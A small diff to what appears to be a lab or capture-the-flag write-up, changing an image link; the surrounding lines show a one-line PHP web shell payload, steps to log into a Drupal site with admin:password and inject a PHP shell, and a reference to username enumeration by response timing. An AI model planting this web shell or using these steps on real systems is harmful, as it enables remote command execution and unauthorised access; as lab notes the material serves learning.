@@ -31,7 +31,7 @@ payload: `<?php system($_GET["cmd"]); ?>`
 
 ![alt text2](0 unsorted/Pasted image 20250905002202.png)
 
-![alt text3](https://github.com/bkornpob/bkornpob.github.io/blob/main/SELENE-username-enumeration-response-timing.png)
+![alt text3](SELENE-username-enumeration-response-timing.png)
 
 1. access the server and login with admin:password
 2. research about Drupal interface and how to inject php shell
